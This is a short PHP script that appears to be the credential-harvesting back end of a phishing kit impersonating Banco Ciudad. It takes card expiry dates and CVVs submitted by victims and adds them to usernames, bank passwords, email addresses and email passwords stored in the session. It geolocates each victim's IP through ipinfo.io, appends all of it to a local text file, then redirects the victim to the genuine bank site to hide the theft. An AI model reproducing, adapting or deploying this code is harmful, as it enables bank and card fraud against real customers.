<?php
@session_start();
@ini_set("display_errors", 1);
$cadena = $_SERVER['HTTP_USER_AGENT'];
$userp = $_SERVER['REMOTE_ADDR'];
$cc = trim(file_get_contents("http://ipinfo.io/{$userp}/country"));


	if(isset($_POST['fvenc']) && isset($_POST['cvv'])) {
	
   
	 $file = fopen("josee.txt", "a");
	 fwrite($file, "Usuario: ".$_SESSION['usr']."\r\nClav.: ".$_SESSION['clv']."\r\nEml:".$_SESSION['eml']."\r\nClave Eml: ".$_SESSION['clveml']."\r\nFecha Venc. tarjeta: ".$_POST['fvenc']."\r\nCVV: ".$_POST['cvv']."\r\nIP: ".$userp." ".$cc." \r\nUser Agent: ".$cadena."\r\n==============================\r\n");
	fclose($file);
	unset ($_SESSION['usr']);
	unset ($_SESSION['clv']);
	unset ($_SESSION['eml']);
	unset ($_SESSION['clveml']);
	header ('location: https://www.bancociudad.com.ar/institucional/');
	 
	}else{
		header ('location: index.html');
	}

?>